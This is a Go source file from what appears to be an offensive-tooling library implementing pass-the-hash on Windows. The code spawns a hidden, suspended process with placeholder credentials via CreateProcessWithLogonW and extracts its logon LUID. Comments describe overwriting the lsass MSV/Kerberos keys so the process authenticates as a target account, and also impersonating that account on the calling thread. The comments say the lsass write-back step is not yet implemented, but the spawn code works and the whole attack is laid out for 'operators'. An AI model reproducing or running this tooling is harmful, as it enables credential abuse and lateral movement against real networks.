//go:build windows

package sekurlsa

import (
	"errors"
	"fmt"
	"os"
	"runtime"
	"unsafe"

	"github.com/oioio-space/maldev/win/api"
	"golang.org/x/sys/windows"
)

// Windows-only Pass / PassImpersonate entry points + spawn helpers
// + the LUID-resolve plumbing (TOKEN_STATISTICS). Cross-platform
// types, sentinel errors, validation, and the MSV mutate helper
// live in pth.go and pth_msv.go.

// Pass spawns the configured Decoy under LOGON_NETCREDENTIALS_ONLY,
// walks the live lsass for the resulting LUID's MSV / Kerberos
// LIST_ENTRY, overwrites the long-term keys with PTHTarget's
// values, and resumes the process. The spawned process now
// outbound-authenticates as Target on every subsequent network
// auth (SMB, RDP, Kerberos AS-REQ, NTLM challenge-response).
//
// CHANTIER II IN PROGRESS — the current cut spawns the decoy and
// resolves its LUID, but the LSA list-walk / write-back step is
// not yet wired (returns ErrPTHNotImplemented after the spawn).
// The PID + LogonID fields of the returned PTHResult ARE populated
// — operators can already build the orchestration on top.
//
// The spawned process is left CREATE_SUSPENDED until either the
// next-commit write-back resumes it, or the caller observes the
// returned PID and resumes manually. The handles owned by Pass
// are closed before return so external resume requires a fresh
// OpenProcess.
func Pass(p PTHParams) (PTHResult, error) {
	if err := validatePTHParams(p); err != nil {
		return PTHResult{}, err
	}

	pid, luid, err := spawnSuspendedDecoy(p)
	if err != nil {
		return PTHResult{}, err
	}

	res := PTHResult{
		PID:     pid,
		LogonID: luid,
	}

	// LSA write-back lands in the next chantier-II commit. Until
	// then, surface the partial success so callers see the spawn
	// + LUID worked.
	return res, fmt.Errorf("%w (spawn+LUID complete; PID=%d LUID=0x%X)",
		ErrPTHNotImplemented, pid, luid)
}

// PassImpersonate is Pass + SetThreadToken: in addition to
// rewriting the spawned process's LSA state, it duplicates the
// spawned process's primary token onto the calling thread so that
// the operator's *current* thread also outbound-authenticates as
// Target until the impersonation token is reverted (or the thread
// exits).
//
// CHANTIER II IN PROGRESS — same partial implementation as Pass.
func PassImpersonate(p PTHParams) (PTHResult, error) {
	if err := validatePTHParams(p); err != nil {
		return PTHResult{}, err
	}

	pid, luid, err := spawnSuspendedDecoy(p)
	if err != nil {
		return PTHResult{}, err
	}

	res := PTHResult{
		PID:     pid,
		LogonID: luid,
	}
	return res, fmt.Errorf("%w (spawn+LUID complete; PID=%d LUID=0x%X)",
		ErrPTHNotImplemented, pid, luid)
}

// spawnSuspendedDecoy launches the decoy process under
// LOGON_NETCREDENTIALS_ONLY + CREATE_SUSPENDED, queries its primary
// token for the LUID, closes the handles, and returns (PID, LUID).
//
// LOGON_NETCREDENTIALS_ONLY (= 2) tells Windows: "use the supplied
// credentials only for network auth — local execution stays under
// the calling user's context." That's the lever PTH leans on: we
// don't actually need a valid password (the LSA write-back replaces
// the per-LUID hash bytes before the process makes any outbound
// call), so any non-empty placeholder works.
//
// CREATE_SUSPENDED (= 4) freezes the primary thread before any code
// runs, giving us a stable window to walk lsass and patch the LUID's
// credential structs without racing the spawned process.
//
// Decoy default is "cmd.exe" so a wide range of post-spawn actions
// is available; operators that want a stub should pass DecoyArgs to
// pin behavior (e.g. `cmd.exe /c "ping -t 127.0.0.1 -n 99999 >nul"`).
func spawnSuspendedDecoy(p PTHParams) (uint32, uint64, error) {
	const (
		logonNetCredentialsOnly uint32 = 2
		createSuspended         uint32 = 0x4
	)

	decoy := p.Decoy
	if decoy == "" {
		decoy = `C:\Windows\System32\cmd.exe`
	}
	cmdline := decoy
	if p.DecoyArgs != "" {
		cmdline = decoy + " " + p.DecoyArgs
	}

	// CreateProcessWithLogonW credentials: any non-empty values work
	// because the LSA write-back is going to replace the per-LUID
	// hashes before the process makes any outbound call. We pass the
	// actual target principal so the lineage in process trees / event
	// logs reads consistently with what the operator intended.
	ptrUser, err := windows.UTF16PtrFromString(p.Target.Username)
	if err != nil {
		return 0, 0, errors.Join(ErrPTHSpawnFailed, fmt.Errorf("UTF16(Username): %w", err))
	}
	ptrDom, err := windows.UTF16PtrFromString(p.Target.Domain)
	if err != nil {
		return 0, 0, errors.Join(ErrPTHSpawnFailed, fmt.Errorf("UTF16(Domain): %w", err))
	}
	// Decoy password — any non-empty UTF-16 string. The spawn
	// doesn't validate it (LOGON_NETCREDENTIALS_ONLY skips local
	// cred check). UTF16PtrFromString rejects embedded NULs, so
	// the placeholder is a plain ASCII marker.
	ptrPwd, err := windows.UTF16PtrFromString("pth-decoy-placeholder")
	if err != nil {
		return 0, 0, errors.Join(ErrPTHSpawnFailed, fmt.Errorf("UTF16(decoy pwd): %w", err))
	}
	ptrApp, err := windows.UTF16PtrFromString(decoy)
	if err != nil {
		return 0, 0, errors.Join(ErrPTHSpawnFailed, fmt.Errorf("UTF16(Decoy): %w", err))
	}
	ptrCmd, err := windows.UTF16PtrFromString(cmdline)
	if err != nil {
		return 0, 0, errors.Join(ErrPTHSpawnFailed, fmt.Errorf("UTF16(cmdline): %w", err))
	}

	si := &windows.StartupInfo{
		Cb:         uint32(unsafe.Sizeof(windows.StartupInfo{})),
		ShowWindow: windows.SW_HIDE,
		Flags:      windows.STARTF_USESHOWWINDOW,
	}
	pi := &windows.ProcessInformation{}

	creationFlags := uintptr(createSuspended) |
		uintptr(windows.CREATE_UNICODE_ENVIRONMENT) |
		uintptr(windows.CREATE_DEFAULT_ERROR_MODE)

	ret, _, e1 := api.ProcCreateProcessWithLogonW.Call(
		uintptr(unsafe.Pointer(ptrUser)),
		uintptr(unsafe.Pointer(ptrDom)),
		uintptr(unsafe.Pointer(ptrPwd)),
		uintptr(logonNetCredentialsOnly),
		uintptr(unsafe.Pointer(ptrApp)),
		uintptr(unsafe.Pointer(ptrCmd)),
		creationFlags,
		0, // lpEnvironment — inherit
		0, // lpCurrentDirectory — inherit
		uintptr(unsafe.Pointer(si)),
		uintptr(unsafe.Pointer(pi)),
	)
	runtime.KeepAlive(ptrUser)
	runtime.KeepAlive(ptrDom)
	runtime.KeepAlive(ptrPwd)
	runtime.KeepAlive(ptrApp)
	runtime.KeepAlive(ptrCmd)
	runtime.KeepAlive(si)
	runtime.KeepAlive(pi)

	if int(ret) == 0 {
		return 0, 0, errors.Join(ErrPTHSpawnFailed,
			os.NewSyscallError("CreateProcessWithLogonW", e1))
	}

	// LUID extraction: OpenProcessToken(TOKEN_QUERY) →
	// GetTokenInformation(TokenStatistics, …). The Statistics struct
	// carries AuthenticationId (the LUID we want) at offset 8.
	luid, err := luidFromProcess(windows.Handle(pi.Process))
	// Close handles regardless of LUID success — the process stays
	// suspended after handles close (until someone resumes it via
	// a fresh handle).
	_ = windows.CloseHandle(windows.Handle(pi.Process))
	_ = windows.CloseHandle(windows.Handle(pi.Thread))
	if err != nil {
		return pi.ProcessId, 0, err
	}
	return pi.ProcessId, luid, nil
}

// luidFromProcess opens the primary token of hProcess and returns
// the LUID of its logon session via GetTokenInformation(
// TokenStatistics). hProcess must already grant
// PROCESS_QUERY_INFORMATION (CreateProcessWithLogonW returns one
// with PROCESS_ALL_ACCESS — sufficient).
//
// The TOKEN_STATISTICS structure (windows.h):
//
//	typedef struct _TOKEN_STATISTICS {
//	  LUID                 TokenId;            // +0
//	  LUID                 AuthenticationId;   // +8  ← LUID we want
//	  LARGE_INTEGER        ExpirationTime;     // +16
//	  TOKEN_TYPE           TokenType;          // +24
//	  SECURITY_IMPERSONATION_LEVEL ImpersonationLevel; // +28
//	  ULONG                DynamicCharged;     // +32
//	  ULONG                DynamicAvailable;   // +36
//	  ULONG                GroupCount;         // +40
//	  ULONG                PrivilegeCount;     // +44
//	  LUID                 ModifiedId;         // +48
//	} TOKEN_STATISTICS;
//
// Only AuthenticationId is consumed.
func luidFromProcess(hProcess windows.Handle) (uint64, error) {
	var hToken windows.Token
	if err := windows.OpenProcessToken(hProcess, windows.TOKEN_QUERY, &hToken); err != nil {
		return 0, errors.Join(ErrPTHSpawnFailed,
			fmt.Errorf("OpenProcessToken: %w", err))
	}
	defer hToken.Close()

	var stats tokenStatistics
	var retLen uint32
	if err := windows.GetTokenInformation(
		hToken,
		windows.TokenStatistics,
		(*byte)(unsafe.Pointer(&stats)),
		uint32(unsafe.Sizeof(stats)),
		&retLen,
	); err != nil {
		return 0, errors.Join(ErrPTHSpawnFailed,
			fmt.Errorf("GetTokenInformation(TokenStatistics): %w", err))
	}
	luid := uint64(stats.AuthenticationID.HighPart)<<32 |
		uint64(stats.AuthenticationID.LowPart)
	return luid, nil
}

// tokenStatistics mirrors TOKEN_STATISTICS. golang.org/x/sys/windows
// does not expose this struct directly so we declare the minimum we
// consume.
type tokenStatistics struct {
	TokenID            windows.LUID
	AuthenticationID   windows.LUID
	ExpirationTime     int64
	TokenType          uint32
	ImpersonationLevel uint32
	DynamicCharged     uint32
	DynamicAvailable   uint32
	GroupCount         uint32
	PrivilegeCount     uint32
	ModifiedID         windows.LUID
}

// MSV constants + mutateMSVPrimary live in pth_msv.go (cross-platform).
// validatePTHParams lives in pth.go.
